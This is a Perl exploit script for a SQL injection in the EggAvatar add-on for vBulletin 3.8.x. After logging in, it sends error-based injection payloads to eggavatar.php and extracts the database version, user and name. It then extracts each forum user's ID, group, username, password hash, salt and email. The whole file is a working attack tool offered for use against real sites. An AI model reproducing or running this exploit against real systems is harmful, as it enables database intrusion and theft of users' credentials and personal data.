#!/usr/bin/env perl
use LWP::UserAgent;
sub banner{
print "###################################\n";
print "############ DSecurity ############\n";
print "###################################\n";
print "# Email:dsecurity.vn[at]gmail.com #\n";
print "###################################\n";
}
if(@ARGV<5){
	print "Usage: $0 address username password number_user sleeptime\n";
	print "Example: $0 http://localhost/vbb test test 10 10\n";
	exit();
}
$ua=LWP::UserAgent->new();
$ua->agent("DSecurity");
$ua->cookie_jar({});
sub login(@){
	my $username=shift;
	my $password=shift;
	my $req = HTTP::Request->new(POST => $ARGV[0].'/login.php?do=login');
	$req->content_type('application/x-www-form-urlencoded');
	$req->content("vb_login_username=$username&vb_login_passwor=$password&s=&securitytoken=1299342473-6b3ca11fdfd9f8e39a9bc69638bf32293bce4961&do=login&vb_login_md5password=&vb_login_md5password_utf=");
	my $res = $ua->request($req);
}
sub v_request{
	#Declare
	$print = $_[0];
	$select = $_[1];
	$from = $_[2];
	$where = $_[3];
	$limit = $_[4];
	$sleep = $ARGV[4];
	if ($from eq '') {$from = 'information_schema.tables';}
	if ($where eq '') {$where = '1';}
	if ($limit eq '') {$limit = '0';}
	if ($sleep eq '') {$sleep = '10';}
	
	# Create a request
	my $req = HTTP::Request->new(POST => $ARGV[0].'/eggavatar.php');
	$req->content_type('application/x-www-form-urlencoded');
	$req->content('do=addegg&securitytoken=1299342473-6b3ca11fdfd9f8e39a9bc69638bf32293bce4961&eggavatar=1'."' and (SELECT 1 FROM(SELECT COUNT(*),CONCAT((select $select  from  $from  WHERE $where limit $limit,1),FLOOR(RAND(1)*3))foo FROM information_schema.tables GROUP BY foo)a)-- -'&uid=1&pid=1");
	# Pass request to the user agent and get a response back
	my $res = $ua->request($req);
	#print $res->content;
	if($res->content =~ /(MySQL Error)(.*?)'(.*?)0'(.*)/)
    	{$test = $3};
	sleep($sleep);
	return $print.$test."\n";
}
&banner;
print "\n#############################################################################################################\n";
print "# EggAvatar for vBulletin 3.8.x SQL Injection Vulnerability                                                 #\n";
print "# Date:06-03-2011                                                                                           #\n";
print "# Author: DSecurity					                                                    #\n";
print "# Software Link: http://www.vbteam.info/vb-3-8-x-addons-and-template-modifications/19079-tk-egg-avatar.html #\n";
print "# Version: 2.3.2                                                                                            #\n";
print "# Tested on: vBulletin 3.8.0                                                                                #\n";
print "#############################################################################################################\n";

#login
login($ARGV[1],$ARGV[2]);
#Foot print
print v_request('MySQL version: ','@@version');
print v_request('Data dir: ','@@datadir');
print v_request('User: ','user()');
print v_request('Database: ','database()');  
#Get user
for($i=1;$i<=$ARGV[3];$i++){
	print "-----------------------------------------\n";
	print $id = v_request('ID: ','userid','user','1',$i-1);
	if($id =~ /(ID:)\s(.*)/){
		print v_request('Group: ','usergroupid','user','userid='.$2);
		print v_request('Username: ','username','user','userid='.$2);
		print v_request('Password: ','password','user','userid='.$2);
		print v_request('Salt: ','salt','user','userid='.$2);
		print v_request('Email: ','email','user','userid='.$2);
	}
			
}